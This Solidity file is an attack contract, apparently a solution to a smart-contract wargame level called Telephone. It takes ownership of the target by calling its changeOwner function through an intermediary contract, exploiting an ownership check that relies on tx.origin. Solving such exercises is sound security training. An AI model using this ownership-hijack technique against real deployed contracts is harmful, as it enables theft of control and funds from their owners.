// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address telephone_) {
        telephone = Telephone(telephone_);
    }

    function attack(address owner) public {
        telephone.changeOwner(owner);
    }
}
